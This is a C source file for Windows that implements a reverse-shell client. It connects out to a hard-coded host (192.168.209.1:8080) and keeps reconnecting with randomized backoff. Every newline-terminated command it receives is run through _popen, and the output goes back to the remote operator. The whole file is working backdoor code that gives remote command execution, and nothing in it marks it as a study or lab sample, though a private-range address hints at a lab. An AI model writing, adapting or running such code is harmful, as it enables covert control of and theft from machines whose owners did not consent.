#define _WIN32_WINNT 0x0600 
#include <winsock2.h>
#include <ws2tcpip.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define INITIAL_BACKOFF 1


SOCKET connect_to_server() {

  SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);

  if (sock == INVALID_SOCKET) {
    printf("Could not create socket. Error: %d\n", WSAGetLastError());
    return INVALID_SOCKET;
  }

  // Server address to connect to
  struct sockaddr_in server_addr;
  memset(&server_addr, 0, sizeof(server_addr));

  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(8080);
  inet_pton(AF_INET, "192.168.209.1", &server_addr.sin_addr);

  // Connect to remote service
  if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
      
    printf("Unable to connect: %d\n", WSAGetLastError());
    closesocket(sock);
    return INVALID_SOCKET;
  }

  return sock;
  
}

int process_cmd(char *cmd, SOCKET sock) {

  FILE *fp = _popen(cmd, "r");

  char output[1024];
  int n_bytes;
  while ((n_bytes = fread(output, 1, sizeof(output), fp)) > 0) {

    size_t sent = 0;
    while (sent < n_bytes) {
      int n = send(sock, output + sent, n_bytes - sent, 0);

      if (n > 0) {
        sent += n;
      } else {
        return -1;
      }
    }

  }

  _pclose(fp);

  return 0;

}

int process_buffered_data(size_t *recv_len, char *recv_buffer, SOCKET sock) {

  char *newline;
  char cmd[1024];
  while ((newline = memchr(recv_buffer, '\n', *recv_len)) != NULL) {
    int cmd_len = newline - recv_buffer;

    // Copy bytes up to \n delimiter from recv_buffer into cmd buffer
    memcpy(cmd, recv_buffer, cmd_len);
    // Append `\0` to make it a string
    cmd[cmd_len] = '\0';

    // Process command
    if (process_cmd(cmd, sock) < 0) {
      return -1;
    }

    // Move remaining bytes back to the start of recv_buffer
    memmove(recv_buffer, recv_buffer + cmd_len + 1, *recv_len - (cmd_len + 1));
    *recv_len = *recv_len - (cmd_len + 1);

  }

  return 0;

}

int process_incoming_byte_stream(SOCKET sock, char *recv_buffer, size_t buffer_capacity, size_t *recv_len) {

  int n = recv(sock, recv_buffer + *recv_len, buffer_capacity - *recv_len, 0);

  if (n > 0) {

    *recv_len += n;
    if (process_buffered_data(recv_len, recv_buffer, sock) < 0) {
      return -1;
    }

  } else {
      return -1;
  }

  return 0;
}

int main() {

  WSADATA wsa;
  WSAStartup(MAKEWORD(2,2), &wsa);

  srand((unsigned int)time(NULL));
  int delay = INITIAL_BACKOFF;
  const int MAX_BACKOFF = 30;
  while (1) {

    SOCKET sock = connect_to_server();

    if (sock == INVALID_SOCKET) {
      
      int sleep_time = 1 + rand() % delay;
      Sleep(sleep_time * 1000);
      delay *= 2;

      if (delay > MAX_BACKOFF) {
        delay = MAX_BACKOFF;
      }

      continue;

    }

    delay = INITIAL_BACKOFF;
    int connection_alive = 1;

    char recv_buffer[1024];
    size_t buffer_capacity = sizeof(recv_buffer);
    size_t recv_len = 0;
    while (connection_alive) {

      if (process_incoming_byte_stream(sock, recv_buffer, buffer_capacity, &recv_len) < 0) {
        closesocket(sock);
        connection_alive = 0;
      }
      
    }
  }

  WSACleanup();
}